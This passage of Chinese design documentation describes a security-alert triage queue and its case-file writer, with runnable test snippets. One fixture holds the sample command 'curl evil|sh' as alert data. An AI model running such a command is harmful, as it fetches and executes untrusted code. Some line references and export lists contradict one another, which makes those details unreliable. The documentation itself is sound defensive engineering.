| 4 | 规则评估（只记步骤，不决定结论） | `triage-monitor.js:376-386` |
| 5 | 写案件目录 | `triage-monitor.js:387-391` |
| 6 | 调 `investigator` 研判 | `triage-monitor.js:1038-1042` |
| 7 | 结果写回案件目录 | `triage-monitor.js:405-411` |
| 8 | 存研判记录 | `triage-monitor.js:413` |
| 9 | 回填结论字段与证据引用 | `triage-monitor.js:416-428` |

研判走哪条分支由牧云事件有没有匹配上决定：

- 没匹配上 → 走 `runUnmatchedSyslog(...)`，并把结果的 `alert_id` 改回本条记录的 ID（`triage-monitor.js:398-399`、`triage-monitor.js:404`）
- 匹配上了 → 走 `run(targetId, { mode: 'triage', ... })`，`targetId` 是牧云侧的事件 ID（`triage-monitor.js:1013`、`triage-monitor.js:1040`）

阶段推进会留痕：`onProgress` 每次把阶段追加进 `steps`，超过 80 条就丢最早一条（`triage-monitor.js:1031-1035`）。

失败处理（P003-T036 起会自动重排）：抛错就记 `status = 'failed'`、阶段「研判失败」、`detail` 截断到 250 字符，
并把原因写进 `failure{reason, code, at}`；接着 `scheduleRetry()` 按 `attempts` 排下一次（第 n 次失败等
`min(retry_base_ms * 2^(n-1), retry_max_ms)`，缺省 1000ms 起、60s 封顶），`attempts` 到 `retry_max_attempts`
（缺省 3）就标 `dead_letter`、不再自动跑（`triage-monitor.js:1078-1082`、`triage-monitor.js:357-380`）。
收尾状态由合并写带走：有排队/等重试的记录就留给写窗口，真闲下来才立刻 `flush()`（`triage-monitor.js:1085-1094`）。

**「模型没交卷」不是失败**（P003-T035）：`investigation-agent` 在调查轮数用尽时改出「存疑 + 缺口清单」的降级结论并正常返回
（`investigation-agent.js:827-843`），所以这一档走的是成功通路——`writeSyslogResult` 照常写 `05-研判结果.md`、记录转 `done`。
这里仍然只接「真抛错」：模型接口报错、案卷写不出来、告警 ID 非法。

### 5.4 人工干预的入口

| 入口 | 行为 | 依据 |
| --- | --- | --- |
| `enqueue(alertId, { retry })` | 已有记录且不是重试 → 直接返回现状；正在跑 → 直接返回 | `triage-monitor.js:676-677` |
| | 队列（排队 + 在跑）已达 `queueLimit` → 抛 429「研判队列已满（上限 N），稍后再试」，并计入 `summary().dropped`；人工入口抛错，轮询与 syslog 收包只丢弃计数（§5.6） | `triage-monitor.js:679-684`、`triage-monitor.js:658-668` |
| | `syslog:` 前缀但没有原始报文 → 抛 404「该 syslog 告警的原始报文不存在，无法重试」 | `triage-monitor.js:671-675` |
| | 其余情况重新排队，`created_at` 沿用原值 | `triage-monitor.js:685-698` |
| | 原记录是**人工登记过的误报**（`verdict='false_positive'` 且 `decision_source='human'`）时，新记录带上 `verdict` / `verdict_label` / `summary` / `decision_source` / `feedback`——不带上去的话重排这一下就把误报标记抹掉了 | `triage-monitor.js:686-695` |
| | 人工重跑会先清掉这条记录的自动重排定时器与死信标记（人工优先于自动重排），`attempts` 留着做记录 | `triage-monitor.js:696-701` |
| `setEnabled(enabled)` | 非布尔 → 抛 400「enabled 必须为布尔值」 | `triage-monitor.js:628-628` |
| | 开关切换会让 `pollEpoch` 加一，用来作废在途的一轮轮询 | `triage-monitor.js:629`、`triage-monitor.js:747` |
| | **暂停（P003-T036 改了契约）**：`enabled=false`，记下本轮暂停起点并清零暂停窗口计数；此后每条 syslog 报文进 `pausedBuffer`（上限 `paused_buffer_limit`，缺省 2000），超出的丢弃并计 `paused.dropped` | `triage-monitor.js:630-639`、`triage-monitor.js:793-808` |
| | **恢复（P003-T036 改了契约）**：游标 `watermark` / `watermarkIds` **原样不动**、**不删任何 queued 记录**；先逐条回灌暂停缓冲（走同一条 `_acceptSyslog`），再 `resumeRetries()` 补上逾期重试，然后 `poll()`（轮询模式）与 `drain()` | `triage-monitor.js:640-654` |
| | 恢复后 `poll` 模式会立刻再轮询一次，因此暂停期间新增的牧云告警也会补判 | `triage-monitor.js:652-652` |
| `cancel(alertId)` | 取消排队中的记录：`queued` / `failed`（含死信）可取消；没有记录 → 抛 404，`running` / `done` → 抛 409 | `triage-monitor.js:500-512` |
| | 取消＝`dropRecord()`：删记录 + 失效指向它的 `dedupe` 条目 + 清重试定时器，之后同一条报文再来算新记录 | `triage-monitor.js:411-417` |
| `status(alertId)` | 查不到返回 `null`（归档出内存的 done 记录也返回 `null`，与「没有记录」同口径）；返回时去掉 `input`（原始报文与解析结果），只留可见字段与步骤 | `triage-monitor.js:514-522` |
| `cases({ count, offset, verdicts, type, host, from, to, sort })` | **只列有 `input` 的记录且只列还在内存里的**，也就是走 syslog 进来、没被 TTL 归档的那些；先筛后倒序分页，`total` 是过滤后条数（详见 §8.1） | `triage-monitor.js:524-550` |
| `summary()` | `initialized`、`enabled`、`input_mode`、`last_poll_at`、`last_error`、四种状态计数 + P003-T036 的 `queue` / `failure_reasons` / `retry` / `paused` / `archived` / `persist` + P003-T037 的 `backoff_ms` / `empty_polls` / `concurrency` / `queue_limit` / `dropped`；`poll` 模式额外带 `interval_ms`；`syslog` 模式带 `syslog: {listening, bind, error}`（能不能收到）与 `syslog_stats`（收了多少 / 丢了多少） | `triage-monitor.js:571-621` |
| `attachSyslog(receiver)` | 启动 syslog 接收器：绑上记 `bind`（`udp://<address>:<port>`），失败记 `error`（截 300 字）且**不抛**，队列与 HTTP 继续服务 | `triage-monitor.js:556-565` |
| `archiveDone({ now })` | 把 `status=done` 且 `updated_at`（没有则 `saved_at`）早于 `done_ttl_ms` 的记录追加到 `<队列文件>.archive.jsonl` 后移出内存；没有时间戳的 done 记录不归档 | `triage-monitor.js:419-434` |

### 5.5 失败重排与 TTL 归档（P003-T036）

| 行为 | 说明 | 依据 |
| --- | --- | --- |
| 退避重排 | 失败记录在 `retryTimers` 里排一个定时器（`unref()`，不挡进程退出）；到点回 `queued`、阶段「等待重试」，`drain()` 接着跑。暂停期间定时器到点直接不跑、`next_attempt_at` 原样留着（所以暂停时在单条状态里能看到一个已逾期的待重试时刻）；恢复时 `resumeRetries()` 把逾期的一次性补上 | `triage-monitor.js:357-380`、`triage-monitor.js:394-409` |
| 死信 | `attempts >= retry_max_attempts` → `dead_letter: true`（**status 仍是 `failed`**，不新增状态值，前端与筛选表都不用改）；原因留在 `failure`，`summary().retry.dead_letters` 报条数 | `triage-monitor.js:357-370`、`triage-monitor.js:590-598` |
| 跨重启 | `load()` 把 `attempts` 到上限的失败记录判死信；`start()` 调 `resumeRetries()` 把其余的排上（逾期的立刻回队） | `triage-monitor.js:194-198`、`triage-monitor.js:317-320`、`triage-monitor.js:394-409` |
| TTL 归档 | `archiveDone()` 把过期的 done 记录追加进 `<队列文件>.archive.jsonl`（一行一条，带 `archived_at`）后移出 `records`，同时失效指向它的 dedupe 条目；`start()` 起扫描定时器（缺省 10 分钟一次，`done_ttl_ms` 缺省 24h，都 `unref()`） | `triage-monitor.js:317-323`、`triage-monitor.js:419-434` |
| 归档后可见性 | 归档记录 `status()` 返回 `null`、`cases()` 不再列它、`summary().counts` 也不再计它；要翻旧案读 JSONL。这是「全表扫不随告警量线性变慢」的代价，已在 `summary().archived` 报归档条数 | `triage-monitor.js:514-522`、`triage-monitor.js:524-550`、`triage-monitor.js:609-615` |
| syslog 回补键 | 队列键是 `syslog:<类型>:<指纹>:<秒>:<uuid>`，研判记录文件键是牧云事件 ID / 结果 ID——`latestInvestigation()` 按 `result_alert_id → matched_alert_id → alert_id` 依次试，第一个读到的就是回补源；都读不到就跳过（不炸） | `triage-monitor.js:215-229`、`triage-monitor.js:200-209` |

### 5.6 取数效率与队列能力（P003-T037）

**A1 增量轮询。** 规则见 §5.2：`from` 是唯一游标，排序键固定 `created_at desc, id asc`；连续空轮按 2 的幂指数退避，见到新告警立刻回 `intervalMs`。实测（仓根跑，退出码 0）：

```bash
cat <<'EOF' | node --input-type=module
import { rm } from 'node:fs/promises';
import { TriageMonitor } from './triage-monitor.js';
await rm('/tmp/tp37-doc', { recursive: true, force: true });
const queries = [];
let rows = [{ id: 'honeypot:1', createdAt: '2026-11-17T10:00:00Z' }];
const service = { async alerts(query) { queries.push(query); return { alerts: rows, partial: false }; } };
const monitor = new TriageMonitor({ service, file: '/tmp/tp37-doc/state.json', inputMode: 'poll', concurrency: 1,
  intervalMs: 1000, maxBackoffMs: 8000, history: { async save(r) { return { alert_id: 'x', saved_at: '', verdict: r.verdict }; }, async latest() { return null; } },
  investigator: { async run(id) { return { alert_id: id, verdict: {} }; } } });
await monitor.load();
await monitor.poll();
console.log('冷启动查询 ->', JSON.stringify(queries[0]), '| watermark=' + monitor.watermark);
rows = [...rows, { id: 'honeypot:2', createdAt: '2026-11-17T10:00:10Z' }];
const incremental = await monitor.poll();
console.log('增量查询 ->', JSON.stringify(queries[1]), '| found=' + incremental.found);
await monitor.poll();
console.log('空轮 -> backoff_ms=' + monitor.backoffMs, 'empty_polls=' + monitor.emptyPolls);
await monitor.poll();
console.log('再空一轮 -> backoff_ms=' + monitor.backoffMs);
rows = [{ id: 'honeypot:3', createdAt: '2026-11-17T10:01:00Z' }, ...rows];
await monitor.poll();
console.log('见到新告警 -> backoff_ms=' + monitor.backoffMs, 'empty_polls=' + monitor.emptyPolls);
EOF
```

```
冷启动查询 -> {"count":50,"offset":0,"sort":"time"} | watermark=2026-11-17T10:00:00Z
增量查询 -> {"count":50,"offset":0,"sort":"time","from":"2026-11-17T10:00:00Z"} | found=1
空轮 -> backoff_ms=2000 empty_polls=1
再空一轮 -> backoff_ms=4000
见到新告警 -> backoff_ms=1000 empty_polls=0
```

退避链由 `#schedule()` 驱动（`triage-monitor.js:331-336`）；`maxBackoffMs` 缺省 `intervalMs × 16`（`triage-monitor.js:112`），`summary().backoff_ms` / `empty_polls` 可查（`triage-monitor.js:607-608`）。

**A2 事件详情一次一拉。** 一次研判（`run()`）建一份详情缓存（`triage-monitor.js:1007-1008`），`observedToolbox(detailCache)` 只缓存 `get_<type>_event`（键 `工具:事件ID`，`triage-monitor.js:51-56`、`triage-monitor.js:976-994`）。三个取数点共用：

| 取数点 | 现在怎么拿详情 | 依据 |
| --- | --- | --- |
| syslog 匹配 | `matchSyslogEvent` 经包装后的 toolbox 真拉一次，结果随 `match.event` 带出 | `syslog-case.js:32`、`triage-monitor.js:1010-1012` |
| 规则评估 | `match.event` 身份一致（`matched && event_id == id`）直接复用，否则才 `callTool` | `triage-rules.js:279` |
| agent 研判 | `streamContext.match.event` 身份一致时构造同形证据记录（`cw:N`），不再入口取数 | `investigation-agent.js:439-455` |

缓存的粒度是**一次 `run()`**：不跨告警共享（`triage-monitor.js:1007-1008` 在 `run()` 内部新建）。trace-board 的第四条路径走它自己的 `analysis` 复用分支（`trace-board.js:372-382`），本卡不改实现、只锁测试。

**A3 结论复用。** 同指纹（指纹已含 `host_ip`）、不同秒、上一条已完结且有结论 → 不新建记录、不排研判，只累加 `repeat_count`（`triage-monitor.js:854-875`），并同步三处：研判记录 `repeat_count`、案卷 `result.json`、`05-研判结果.md` 的「重复投递」。返回 `{ reused: true, repeat_count, alert_id }`。上一条未完结（排队 / 在跑 / 失败）时不复用，照常新排（`triage-monitor.js:854-855`）。要在复用之后再研判一次，走 `enqueue(alertId, { retry: true })`。

**A4 优先级。** 类型风险档位表在 `triage-monitor.js:19-23`，逐类值：`memory_webshell` 11、`webshell`/`revshell`/`malware` 10、`memory_security` 9、`honeypot`/`elevation_process` 8、`brute_force` 7、`abnormal_login` 6、`suspicious_operation` 5、`network_audit` 4，表外 / 未知类型 0。`drain()` 按（风险 desc，`occurrence_count` desc，`created_at` asc）取第一条（`triage-monitor.js:942-958`）。syslog 记录的类型从 `input.parsed.msgid` 映射，轮询记录从 `alert_id` 的 `type:` 前缀取（`triage-monitor.js:38-40`）。

**A5 队列上限与配置。** 两个启动参数（改完要重启进程）：

| 环境变量 | 缺省 | 含义 | 读取位置 |
| --- | --- | --- | --- |
| `HIDS_TRIAGE_CONCURRENCY` | 2 | 同时研判条数 | `triage-monitor.js:30`、`triage-monitor.js:108-109` |
| `HIDS_TRIAGE_QUEUE_MAX` | 1000 | 「排队 + 在跑」的记录上限 | `triage-monitor.js:31`、`triage-monitor.js:111` |

非法值回落规则（`triage-monitor.js:26-36`）：**env 里的 0 / 负数 / 小数 / 非数 / 空串一律回落缺省 2**；**构造参数显式传数字 0 是合法值——不起 worker、只排队**（P003-T036 的测试与停机维护需要「入队但不跑」，这条是两个卡合并后的约定）。**装配处不覆盖这两个值**（`server.js:55-57`）：`poll` 与 `syslog` 两种输入模式都按 `HIDS_TRIAGE_CONCURRENCY` 生效（`syslog` 模式不再固定 1），`summary().concurrency` 报的是**规范化后的生效值**——非法 env 回落成 2，接口就回 2，不回原始串。队列满时：手动 `enqueue` 抛 429（`triage-monitor.js:615-620`）；轮询批量入队与 syslog 收包只丢弃并计数，不抛（`triage-monitor.js:758-762`、`triage-monitor.js:871-878`）。丢弃总数在 `summary().dropped`，每次丢弃记 `triage.dropped` 日志（`triage-monitor.js:665-668`）。

## 6 关键路径四：案件目录

### 6.1 目录长什么样

案件目录路径形如 `<目录根>/<MsgId>/<时间戳>-<摘要>-<随机后缀>/`（`syslog-case.js:97`）：

| 段 | 怎么来的 | 依据 |
| --- | --- | --- |
| MsgId | 报文里的 MsgId 原文，例如 `cloudwalker-webshell` | `syslog-case.js:97` |
| 时间戳 | ISO 时间去掉 `-` 与 `:`、把 `T` 换成 `-`、去掉小数部分，形如 `20261117-102940` | `syslog-case.js:94` |
| 摘要 | `sha1(原始报文 + \0 + 牧云事件 + \0 + 上下文)` 的前 8 位十六进制 | `syslog-case.js:95-96` |
| 随机后缀 | uuid 的前 8 位 | `syslog-case.js:97` |

目录按 `0o700` 创建（`syslog-case.js:98`）。

### 6.2 目录里的文件

固定 5 个（`syslog-case.js:101-106`）；传入 `wiki` 时多写 1 个（`syslog-case.js:108-111`）：

| 文件 | 内容 | 依据 |
| --- | --- | --- |
| `00-这是什么.md` | 入口：先看 `03-研判事实.md`，再按需核对原始告警、字段、上下文 | `syslog-case.js:102` |
| `01-原始告警.txt` | syslog 原始报文 | `syslog-case.js:103` |
| `02-告警字段.md` | 消息时间、载荷格式，以及 `payload` 按键逐行展开的字段表 | `syslog-case.js:104` |
| `03-研判事实.md` | 主机 IP、事件时间、来源、命令、文件路径、牧云匹配情况，外加牧云补充事件的 JSON | `syslog-case.js:105` |
| `04-上下文.md` | 会话键、本条出现次数、投递次数、同会话时间窗，以及 `window`/`baseline`/`intel`/`history` 的 JSON | `syslog-case.js:106` |
| `03b-判据索引.md` | 只有传了 `wiki` 才有：本次可用判据的编号与标题 | `syslog-case.js:108-111` |
| `06-必查项.json` | 研判收尾时由 `investigation-agent` 追加（P003-T040）：每项必查的 `status`/`evidence_id`/`returned_count`/`total_reported` 与前 5 行 `first_rows` | `syslog-case.js:179-207`、`investigation-agent.js:513-519` |

字段表里的 `|` 会被转义、换行会被压成空格（`syslog-case.js:99-100`）。这几个材料文件并行写入，权限 `0o600`（`syslog-case.js:112-113`），函数返回 `{ case_dir, files }`（`syslog-case.js:114`）。

`06-必查项.json` 不在 `writeSyslogCase` 里写：它依赖研判的必查项结果，由 `run()` 收尾时调 `writeRequiredEvidence()`
（`syslog-case.js:187-207`）原子追加，并把文件名补进 `caseInfo.files`（`syslog-case.js:204`）。
写失败是真异常：捷径（客户经验复用）路径的落盘也在知识库 try 块之外，不被「经验核对失败」吞掉（`investigation-agent.js:592-595`）。
**上界 64000 字符**（`syslog-case.js:180`）：超界的项先降级成「只留计数」（`slimmed_items`），仍放不下的整项不写并计入
`omitted_items` + `truncated`（`syslog-case.js:191-197`）——宁可少写行，也不让案卷无界增长，更不静默丢项。
复算入口 `readRequiredEvidence(caseInfo)`（`syslog-case.js:209-212`）只读这个文件，不碰牧云。

**能被模型读的条件**：`readCaseFile` 有 25000 字符闸（`syslog-case.js:172`，见 §6.4），所以这个文件 ≤25000 字符时模型能用
`read_case_file('06-必查项.json')` 直接读；超过 25000（一直到 64000）时模型读到的是错误提示，复算要走
`readRequiredEvidence()`——它没有这道闸，读的是全文。

**实测**：

```bash
cat <<'EOF' | node --input-type=module
import { rm } from 'node:fs/promises';
import { writeSyslogCase, readCaseFile } from './syslog-case.js';
await rm('/tmp/tp-case', { recursive: true, force: true });
const parsed = { msgid: 'cloudwalker-webshell', ts: '2026-11-17T10:00:00Z', payload_format: 'keyvalue', payload: { host_ip: '10.0.0.5', source_ip: '1.2.3.4', event_create_time: '2026-11-17 18:00:00', event_name: 'webshell', process_command_line: 'curl evil|sh', file_path: '/tmp/a.php' } };
const info = await writeSyslogCase({ directory: '/tmp/tp-case', raw: 'RAW-LINE', parsed, context: { occurrence_count: 2, delivery_count: 1, window: [{ at: 1 }], baseline: {}, intel: {}, history: [] }, match: { matched: true, alert_id: 'webshell:7', gap_seconds: 3, coverage: { exact_event_id: true, returned: 1, total: 1 }, event: { id: 7 } }, wiki: null });
console.log('case_dir ->', info.case_dir);
console.log('files ->', JSON.stringify(info.files));
console.log('03-研判事实.md 首行 ->', (await readCaseFile(info, '03-研判事实.md')).content.split('\n')[0]);
EOF
```

```
case_dir -> /tmp/tp-case/cloudwalker-webshell/20261117-103410-ea0fab91-214e57bb
files -> ["00-这是什么.md","01-原始告警.txt","02-告警字段.md","03-研判事实.md","04-上下文.md"]
03-研判事实.md 首行 -> # 研判事实
```

时间戳与随机后缀每次运行都不同；摘要 `ea0fab91` 在同一份输入下不变（它由报文、牧云事件、上下文三部分算出，`syslog-case.js:95-96`）。

### 6.3 牧云事件怎么关联

`matchSyslogEvent(toolbox, parsed)`（`syslog-case.js:23-84`）两条路径：

**路径一：按 `event_id` 精确读**（`syslog-case.js:29-56`）。条件是 `payload.event_id` 是合法正整数且工具箱可调用（`syslog-case.js:30`），用 `get_<类型>_event` 读详情（`syslog-case.js:32`）。回读结果要同时满足三条才算数（`syslog-case.js:37-45`）：事件 ID 对得上、主机 IP 对得上（去掉 `/32` 后缀再比）、`host_id` 是合法整数且等于 `payload.host_id`。任一条不符就是未匹配，原因写「牧云事件 ID 对应的主机与 syslog 不一致」（`syslog-case.js:46-48`）；读取抛错则是「牧云事件 ID 详情读取失败：…」（`syslog-case.js:52-55`）。成功时 `coverage.exact_event_id` 为真（`syslog-case.js:51`）。

**路径二：按同主机同类型的第一批事件匹配**（`syslog-case.js:57-83`）。只查第一页 50 条（`syslog-case.js:61`），在时间差不超过 300 秒的事件里取最近的一条（`syslog-case.js:63-70`）。没有落在窗口内的 → 「同主机首批事件中没有落在事件时间前后 5 分钟的同类记录」（`syslog-case.js:71-74`）；最近的一条没有合法 ID → 未匹配（`syslog-case.js:75-78`）；查询抛错 → 「牧云事件查询失败：…」（`syslog-case.js:82-83`）。成功时 `coverage.first_page_only` 为真，`returned` 与 `total` 是这一页的条数与总数（`syslog-case.js:81`）。

缺主机 IP 或有效事件时间时直接未匹配（`syslog-case.js:57-59`）。**未匹配不是错误**，它是正常分支：主流程据此改走 `runUnmatchedSyslog`（`triage-monitor.js:1038-1039`）。

### 6.4 读回材料

`readCaseFile(caseInfo, name)`（`syslog-case.js:169-174`）有道闸：

- `name` 不在 `caseInfo.files` 里 → 抛「研判材料文件不在当前告警目录」（`syslog-case.js:170`）
- 内容超过 25000 字符 → 返回 `{ name, error: '材料超过本次读取上限，请使用 03-研判事实.md 的摘要' }`，**不给内容**（`syslog-case.js:172`）

## 7 关键路径五：结果写回

### 7.1 写回什么

`writeSyslogResult(caseInfo, result)`（`syslog-case.js:117-147`）往案件目录里追加两个文件：

- `05-研判结果.md`：给运维看的（`syslog-case.js:120-139`）
- `result.json`：`result` 的完整序列化，结构化证据、引用、独立复核都在里面（`syslog-case.js:140`）

md 每一行的取值与缺省：

| 行 | 取自 | 缺省 | 依据 |
| --- | --- | --- | --- |
| 结论 | `verdict.verdict_label` | 存疑 | `syslog-case.js:122` |
| 置信度 | `verdict.confidence` | 低 | `syslog-case.js:123` |
| 事件关联 | `result.syslog.event_id_match` 为真则「已关联牧云事件」，否则「牧云事件未匹配」 | — | `syslog-case.js:124` |
| 重复投递 | `result.repeat_count` | 1 次 | `syslog-case.js:125` |
| 给运维看的报告 | `verdict.report` → `verdict.analysis` → `verdict.summary` | 本次研判未生成报告 | `syslog-case.js:129` |
| 可核验事实 | `verdict.claims` 的条数 | 0 条 | `syslog-case.js:133` |
| 证据校验 | `result.validation.ok` 为真则「通过」，否则「未通过，需人工复核」 | — | `syslog-case.js:133` |
| 数据缺口 | `verdict.missing_evidence` 用 `；` 连接 | 无已记录缺口 | `syslog-case.js:134` |
| 建议行动 | `verdict.next_actions` 用 `；` 连接 | 人工复核 | `syslog-case.js:135` |

末尾一句「结构化证据、引用与独立复核见同目录 result.json」（`syslog-case.js:137`）。这两个文件各自用「临时文件 + `rename`」落位，权限 `0o600`，临时名带 uuid（`syslog-case.js:141-146`）。

### 7.2 什么时候写

调用点在 `run()` 里：先把 `result.syslog`（含匹配情况与重复次数）、`result.case_dir`、`result.repeat_count` 补到结果上（`triage-monitor.js:1045-1050`），再调 `writeSyslogResult`（`triage-monitor.js:1051`），最后才存研判记录（`triage-monitor.js:1053`）。

顺序上有一条值得记住：**案件材料在研判之前就写好了**（`triage-monitor.js:387-391` 早于 `triage-monitor.js:398`），结果文件是研判之后追加的。所以研判进行中读目录，能读到材料文件，读不到结果文件。

### 7.3 重复次数回写

同秒重复投递且原记录已完结时，`updateSyslogDeliveryCount(caseDir, count)`（`syslog-case.js:149-167`）改两个地方：

| 改动 | 做法 | 依据 |
| --- | --- | --- |
| `result.json` 的 `repeat_count` | 直接赋值 | `syslog-case.js:155` |
| `result.json` 的 `syslog.repeat_count` | 有 `syslog` 字段才改 | `syslog-case.js:156` |
| `05-研判结果.md` 的「重复投递」行 | 正则 `^重复投递：.*$` 整行替换 | `syslog-case.js:161` |

两个边界：`caseDir` 为空直接返回（`syslog-case.js:150`）；`result.json` 不存在也直接返回（`syslog-case.js:154`）。写回同样是临时文件 + `rename`（`syslog-case.js:163-165`）。

调用点在 `triage-monitor.js:840-843`——只有原记录已经 `done` 时才回写案件目录；原记录还在排队或运行中时不回写。

**实测**：

```bash
cat <<'EOF' | node --input-type=module
import { rm, readFile } from 'node:fs/promises';
import { TriageMonitor } from './triage-monitor.js';
await rm('/tmp/tp-repeat', { recursive: true, force: true });
const saved = [];
const history = {
  async save(r) { const s = { alert_id: `saved-${saved.length + 1}`, saved_at: new Date().toISOString(), decision_source: 'ai', verdict: r.verdict }; saved.push(s); return s; },
  async latest() { return saved[0] || null; }
};
const investigator = { async runUnmatchedSyslog() { return { verdict: { verdict: 'uncertain', verdict_label: '存疑', summary: 'u' }, validation: { ok: true } }; } };
const monitor = new TriageMonitor({ service: {}, investigator, history, file: '/tmp/tp-repeat/state.json', inputMode: 'syslog', concurrency: 1, casesDirectory: '/tmp/tp-repeat/cases' });
await monitor.start();
const line = '<134>1 2026-11-17T10:00:00Z host app - cloudwalker-webshell event_id=7 host_ip=10.0.0.5 process_command_line="id" event_create_time="2026-11-17 10:00:00"';
await monitor.acceptSyslog(line);
await new Promise(r => setTimeout(r, 200));
const rec = [...monitor.records.values()][0];
const before = JSON.parse(await readFile(`${rec.case_dir}/result.json`, 'utf8'));
console.log('重复前 -> repeat_count=' + before.repeat_count, '| syslog.repeat_count=' + before.syslog.repeat_count);
const again = await monitor.acceptSyslog(line);
console.log('同秒第 2 条 ->', JSON.stringify({ collapsed: again.collapsed, repeat_count: again.repeat_count }));
await new Promise(r => setTimeout(r, 100));
const after = JSON.parse(await readFile(`${rec.case_dir}/result.json`, 'utf8'));
console.log('重复后 -> repeat_count=' + after.repeat_count, '| syslog.repeat_count=' + after.syslog.repeat_count);
console.log('md 行 ->', (await readFile(`${rec.case_dir}/05-研判结果.md`, 'utf8')).split('\n').find(l => l.startsWith('重复投递')));
console.log('研判记录被重写次数 ->', saved.length);
EOF
```

```
重复前 -> repeat_count=1 | syslog.repeat_count=1
同秒第 2 条 -> {"collapsed":true,"repeat_count":2}
重复后 -> repeat_count=2 | syslog.repeat_count=2
md 行 -> 重复投递：2 次
研判记录被重写次数 -> 2
```

最后一行是另一处回写：同秒重复且原记录已完结时，研判记录也会被重新保存一次，把新的重复次数带进去（`triage-monitor.js:279-283`）。

### 7.4 记录上的回填内容

研判记录存好后，`run()` 把结论相关字段回填到队列记录上（`triage-monitor.js:1059-1074`）：`verdict`、`verdict_label`、`summary`、`saved_at`、`report`、`missing_evidence`、`next_actions`、`evidence_refs`（取前 10 条引用的 `evidence_id` 与 `pointer`，`triage-monitor.js:1071-1072`）、`verified_facts`、`evidence_sources`。

其中后两个来自 `evidenceSummary()`（`triage-monitor.js:83-88`）：只统计带 `citations` 的事实，且要求 `validation.ok` 或 `validation.removed_unverified_facts` 为真，否则 `verified_facts` 记 0；`evidence_sources` 是去重后的证据编号个数。

**`evidence[]` 的形状（P003-T040 A6）**：队列记录里的证据条目只留 `evidence_id` / `tool` / `fetched_at` / `sha256`，
加一个**条件性**的 `args`——只要它是 RPC 形态（`{id}` / `{count,offset}` 这类短参数，序列化后 ≤200 字、
没有超过 80 字的字符串值）就保留，含原文的剥掉并置 `args_omitted: true`（`triage-monitor.js:16-32`）。
改前一律剥 `args`，队列里看不出每条证据查的是什么范围。`view` 不进队列：快照随状态变更落盘，带上视图会把快照撑大
（视图落盘在研判记录里，见 investigation-agent 模块页 §3.10）。

**人工登记过误报的记录是例外**（`verdict='false_positive'` 且 `decision_source='human'`，`triage-monitor.js:63`）：`verdict` / `verdict_label` / `summary` / `decision_source` 保留原值，`detail` 跟着保留的那份 `summary` 走（`triage-monitor.js:1059-1065`）；`report` / `missing_evidence` / `next_actions` / `evidence_refs` / `evidence` / `saved_at` / `verified_facts` / `evidence_sources` 照常按这次研判刷新。AI 自己判出的 `false_positive` 不走这条例外。
**人工登记过误报的记录是例外**（`verdict='false_positive'` 且 `decision_source='human'`，`triage-monitor.js:13`）：`verdict` / `verdict_label` / `summary` / `decision_source` 保留原值，`detail` 跟着保留的那份 `summary` 走（`triage-monitor.js:529-537`）；`report` / `missing_evidence` / `next_actions` / `evidence_refs` / `evidence` / `saved_at` / `verified_facts` / `evidence_sources` 照常按这次研判刷新。AI 自己判出的 `false_positive` 不走这条例外。

## 8 对外契约

三个文件的导出（实测）：

| 文件 | 导出 |
| --- | --- |
| `syslog-input.js` | `parseSyslog`、`eventTypeFor`、`eventSeconds`、`sessionKey`、`fingerprint`、`SyslogReceiver` |
| `syslog-case.js` | `matchSyslogEvent`、`writeSyslogCase`、`writeSyslogResult`、`updateSyslogDeliveryCount`、`readCaseFile`、`writeRequiredEvidence`、`readRequiredEvidence`、`requiredEvidenceFile`（P003-T040 新增后四个） |
| `triage-monitor.js` | `TriageMonitor`、`typeRisk`、`comparePriority`（P003-T037 新增后两个）、`queueEvidenceItem`、`queueArgsMaxChars`、`queueArgValueMaxChars`（P003-T040） |

```bash
for f in syslog-input.js syslog-case.js triage-monitor.js; do printf "%s: " "$f"; node -e "import('./$f').then(m=>console.log(Object.keys(m).sort().join(', ')))"; done
```

```
syslog-input.js: SyslogReceiver, eventSeconds, eventTypeFor, fingerprint, parseSyslog, sessionKey
syslog-case.js: matchSyslogEvent, readCaseFile, updateSyslogDeliveryCount, writeSyslogCase, writeSyslogResult
triage-monitor.js: TriageMonitor, comparePriority, typeRisk
```

`TriageMonitor` 的公开方法：

| 方法 | 用途 | 依据 |
| --- | --- | --- |
| `load()` | 读状态文件，把中断留下的 `running` 记录改回 `queued`；回补研判记录时按 `result_alert_id → matched_alert_id → alert_id` 试键（§5.5） | `triage-monitor.js:175-210` |
| `markDirty()` | 标脏（热路径用），写盘由合并写窗口接管 | `triage-monitor.js:231-238` |
| `persist()` | 标脏并等到自己这一代落盘（管理面用） | `triage-monitor.js:240-242` |
| `flush()` | 立刻落一次（没有新脏状态时不写） | `triage-monitor.js:259-274` |
| `writeChain`（getter） | 「等落盘」的同步点，等价 `persist()` | `triage-monitor.js:246` |
| `start()` | 启动：读盘 → 补排逾期重试 → 起轮询/归档定时器 → 按输入模式轮询或直接排空；poll 模式用退避链（`#schedule`）而不是 `setInterval` | `triage-monitor.js:317-325`、`triage-monitor.js:331-336` |
| `stop()` | 停掉轮询链、归档、合并写与重试定时器 | `triage-monitor.js:342-349` |
| `status(alertId)` | 单条记录现状（去掉原始报文）；归档出内存的记录返回 `null` | `triage-monitor.js:514-522` |
| `cases({ count, offset, verdicts, type, host, from, to, sort })` | 案件列表（只列 syslog 来源且还在内存里的）；筛选与排序语义见 §8.1 | `triage-monitor.js:524-550` |
| `summary()` | 运行态概览：状态/结论/类型分布 + 队列深度 / 失败原因 / 重试上限 / 暂停窗口 / 归档 / 落盘窗口 / 收包计数 + 退避与并发上限 | `triage-monitor.js:571-621` |
| `attachSyslog(receiver)` | 启动 syslog 接收器，绑定成败入 `summary().syslog` | `triage-monitor.js:556-565` |
| `setEnabled(enabled)` | 暂停 / 恢复（暂停收进缓冲不丢、恢复不动游标，§5.4） | `triage-monitor.js:627-654` |
| `enqueue(alertId, { retry })` | 手动入队或重试（会清掉这条的自动重排定时器与死信标记；队列满回 429） | `triage-monitor.js:670-701` |
| `cancel(alertId)` | 取消排队中的记录（`queued` / `failed`）；404 / 409 见 §5.4 | `triage-monitor.js:500-512` |
| `scheduleRetry(record, delayMs?)` / `resumeRetries()` | 失败记录的退避重排 / 启动与恢复时补排 | `triage-monitor.js:357-380`、`triage-monitor.js:394-409` |
| `archiveDone({ now })` | 过期 done 记录按 TTL 归档出内存 | `triage-monitor.js:419-434` |
| `dropRecord(alertId)` | 删记录 + 失效 dedupe + 清重试定时器 | `triage-monitor.js:411-417` |
| `poll()` | 跑一轮增量轮询，返回 `{found, empty, failed}` 并更新退避 | `triage-monitor.js:707-774` |
